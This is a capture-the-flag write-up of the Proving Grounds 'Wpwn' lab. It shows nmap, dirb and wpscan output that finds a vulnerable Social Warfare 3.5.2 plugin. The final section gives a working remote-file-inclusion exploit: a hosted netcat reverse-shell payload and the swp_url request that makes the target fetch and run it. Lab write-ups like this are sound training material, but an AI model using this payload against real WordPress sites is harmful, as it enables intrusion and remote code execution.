# IP: 192.168.68.123 
# New-ip: 192.168.188.123

# Enumeration

# Nmap

```python
┌──(dx㉿kali)-[~/Desktop/Proving-ground/Wpwn]
└─$ nmap 192.168.68.123
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-21 09:59 EDT
Nmap scan report for 192.168.68.123
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```

# Nmap - Advanced

```python
                                                                                                                                                 
┌──(dx㉿kali)-[~]
└─$ nmap -p 22,80 -sC -sV 192.168.68.123
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-21 10:03 EDT
Nmap scan report for 192.168.68.123
Host is up (0.28s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 59:b7:db:e0:ba:63:76:af:d0:20:03:11:e1:3c:0e:34 (RSA)
|   256 2e:20:56:75:84:ca:35:ce:e3:6a:21:32:1f:e7:f5:9a (ECDSA)
|_  256 0d:02:83:8b:1a:1c:ec:0f:ae:74:cc:7b:da:12:89:9e (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.62 seconds

```

# Finding- From Nmap
```python
port-80:  Apache httpd 2.4.38
port-22:  OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0
```

# Navigating Port-80
![htb-wpwn-page-visit](https://user-images.githubusercontent.com/98345027/185795050-57a2e29b-5424-4bb1-93c7-eac9e24e66fe.png)

# Robots.txt-Page
![htb-wpwn-page-robots](https://user-images.githubusercontent.com/98345027/185795334-24c168dd-82c1-4ae4-801c-763020a2e7b4.png)

# /secret

![htb-wpwn-page-secret](https://user-images.githubusercontent.com/98345027/185795447-e57800c9-4cb0-4683-ba88-d72b2fbf0b8e.png)

# Findings-webpage

```python
Webpage and source page doesn't reveal anything interesting/sensitive
```


# Dirbuster

```python
                                                                                                                                                 
┌──(dx㉿kali)-[~/Desktop/Proving-ground/Wpwn]
└─$ dirb http://192.168.89.123/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Aug 22 10:59:32 2022
URL_BASE: http://192.168.89.123/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.89.123/ ----
+ http://192.168.89.123/index.html (CODE:200|SIZE:23)                                                                                           
+ http://192.168.89.123/robots.txt (CODE:200|SIZE:57)                                                                                           
+ http://192.168.89.123/server-status (CODE:403|SIZE:279)                                                                                       
==> DIRECTORY: http://192.168.89.123/wordpress/                                                                                                 
                                                                                                                                                
---- Entering directory: http://192.168.89.123/wordpress/ ----
+ http://192.168.89.123/wordpress/index.php (CODE:301|SIZE:0)                                                                                   
==> DIRECTORY: http://192.168.89.123/wordpress/wp-admin/                                                                                        
==> DIRECTORY: http://192.168.89.123/wordpress/wp-content/                                                                                      
==> DIRECTORY: http://192.168.89.123/wordpress/wp-includes/                                                                                     
+ http://192.168.89.123/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                                                                 
                                                                                                                                                
---- Entering directory: http://192.168.89.123/wordpress/wp-admin/ ----
+ http://192.168.89.123/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                                                                          
==> DIRECTORY: http://192.168.89.123/wordpress/wp-admin/css/                                                                                    
==> DIRECTORY: http://192.168.89.123/wordpress/wp-admin/images/                                                                                 
==> DIRECTORY: http://192.168.89.123/wordpress/wp-admin/includes/                                                                               
+ http://192.168.89.123/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                                                                          
==> DIRECTORY: http://192.168.89.123/wordpress/wp-admin/js/                                                                                     
==> DIRECTORY: http://192.168.89.123/wordpress/wp-admin/maint/                                                                                  
==> DIRECTORY: http://192.168.89.123/wordpress/wp-admin/network/                                                                                
==> DIRECTORY: http://192.168.89.123/wordpress/wp-admin/user/                                                                                   
                                                                                                                                                
---- Entering directory: http://192.168.89.123/wordpress/wp-content/ ----
+ http://192.168.89.123/wordpress/wp-content/index.php (CODE:200|SIZE:0)                                                                        
==> DIRECTORY: http://192.168.89.123/wordpress/wp-content/plugins/                                                                              
==> DIRECTORY: http://192.168.89.123/wordpress/wp-content/themes/                                                                               
==> DIRECTORY: http://192.168.89.123/wordpress/wp-content/upgrade/                                                                              
==> DIRECTORY: http://192.168.89.123/wordpress/wp-content/uploads/                                                                              
                                                                                                                                                
---- Entering directory: http://192.168.89.123/wordpress/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                
---- Entering directory: http://192.168.89.123/wordpress/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                
---- Entering directory: http://192.168.89.123/wordpress/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                
---- Entering directory: http://192.168.89.123/wordpress/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                
---- Entering directory: http://192.168.89.123/wordpress/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                
---- Entering directory: http://192.168.89.123/wordpress/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                
---- Entering directory: http://192.168.89.123/wordpress/wp-admin/network/ ----
+ http://192.168.89.123/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                                                                  
+ http://192.168.89.123/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                                                                  
                                                                               
```








# WP-SCAN

```PYTHON
┌──(dx㉿kali)-[~]
└─$ wpscan --url http://192.168.89.123/wordpress -e ap
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://192.168.89.123/wordpress/ [192.168.89.123]
[+] Started: Mon Aug 22 11:19:02 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.89.123/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.89.123/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.89.123/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.89.123/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5 identified (Insecure, released on 2020-08-11).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.89.123/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5</generator>
 |  - http://192.168.89.123/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://192.168.89.123/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://192.168.89.123/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.0
 | Style URL: http://192.168.89.123/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.89.123/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: 'Version: 1.5'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] social-warfare
 | Location: http://192.168.89.123/wordpress/wp-content/plugins/social-warfare/
 | Last Updated: 2021-07-20T16:09:00.000Z
 | [!] The version is out of date, the latest version is 4.3.0
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Comment (Passive Detection)
 |
 | Version: 3.5.2 (100% confidence)
 | Found By: Comment (Passive Detection)
 |  - http://192.168.89.123/wordpress/, Match: 'Social Warfare v3.5.2'
 | Confirmed By:
 |  Query Parameter (Passive Detection)
 |   - http://192.168.89.123/wordpress/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.2
 |   - http://192.168.89.123/wordpress/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.2
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.89.123/wordpress/wp-content/plugins/social-warfare/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.89.123/wordpress/wp-content/plugins/social-warfare/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Aug 22 11:19:12 2022
[+] Requests Done: 49
[+] Cached Requests: 5
[+] Data Sent: 11.511 KB
[+] Data Received: 18.918 MB
[+] Memory used: 232.605 MB
[+] Elapsed time: 00:00:09

```

# FINDINGS-WPSCAN
```python
Plugin used in wordpress Social Warfare v3.5.2(out of date)
Reference-of-the-exploit: https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618
```

# Exxploitation

```python
creating a payload called shell.txt
Inside a payload: <pre>system('nc kali-IP 4444 -e /bin/bash')</pre>
we host in our kali machine
command: sudo python3 -m http.server 80
and then setup a listener--> nc -lvp 4444
http://192.168.89.123/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.49.89/shell.txt
-->http://192.168.89.123/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.1.109/shell.txt

```
